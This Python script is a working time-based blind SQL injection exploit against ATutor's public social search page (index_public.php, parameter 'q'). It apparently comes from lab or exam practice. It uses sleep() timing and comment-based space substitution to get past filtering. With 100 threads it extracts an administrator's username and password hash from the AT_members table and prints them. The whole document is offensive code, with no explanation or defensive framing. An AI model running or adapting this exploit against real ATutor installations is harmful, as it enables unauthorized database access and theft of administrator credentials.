#base
import requests, concurrent.futures, sys, itertools
#proxies
proxies = {
    "http":"127.0.0.1:8080",
    "https":"127.0.0.1:8080"
}

class ExploitSQLi:
    def __init__(self, ip):
        self.ip = ip
        self.time_delay = 5 #change this
        self.injection_string = "a' or if((ascii(substring(([QUERY]),[POSITION],1))=[CHAR]),sleep({}),0) or 1='".format(self.time_delay) #change this
        self.url = "http://{}/ATutor/mods/_standard/social/index_public.php?q=[PAYLOAD]".format(self.ip) #change this
        
    def set_query(self, query):
        self.query = query
        
    def get_character_at(self, position, index):
        final_injection_string = self.injection_string.replace("[QUERY]", self.query).replace("[POSITION]", str(position)).replace("[CHAR]", str(index))
        response = requests.get(self.url.replace("[PAYLOAD]", final_injection_string).replace(" ", "/**/"))
        if(response.elapsed.total_seconds() > self.time_delay):
            return chr(index)
        else:
            return ''
    
    def get_result(self, length, number_of_workers = 100):
        lst = list(itertools.product(range(1, int(length)+1), range(32, 127), repeat=1))
        x1 = [x[0] for x in lst]
        x2 = [x[1] for x in lst]
        subexecutor = concurrent.futures.ThreadPoolExecutor(max_workers=number_of_workers)
        subthreads = subexecutor.map(self.get_character_at, x1, x2)
        return ''.join(subthreads)
    
def main():
    ip = 'atutor'
    obj = ExploitSQLi(ip)
    query_get_length_username = "select length(login) from AT_members where status=3 limit 1"
    query_get_username = "select login from AT_members where status=3 limit 1"
    query_get_length_password = "select length(password) from AT_members where status=3 limit 1"
    query_get_password = "select password from AT_members where status=3 limit 1"
    
    print("(+) Trying get data...")
    #Get username
    obj.set_query(query_get_length_username)
    length_of_username = obj.get_result(3) #can be change value of parameter, default is 3
    print("Length of username is: ", length_of_username)
    obj.set_query(query_get_username)
    username = obj.get_result(length_of_username)
    print("Username is: ", username)
    #Get password
    obj.set_query(query_get_length_password)
    length_of_password = obj.get_result(3) # same above
    print("Length of password is: ", length_of_password)
    obj.set_query(query_get_password)
    password = obj.get_result(length_of_password)
    print("Password is: ", password) 
    
if __name__ == "__main__":
    main()
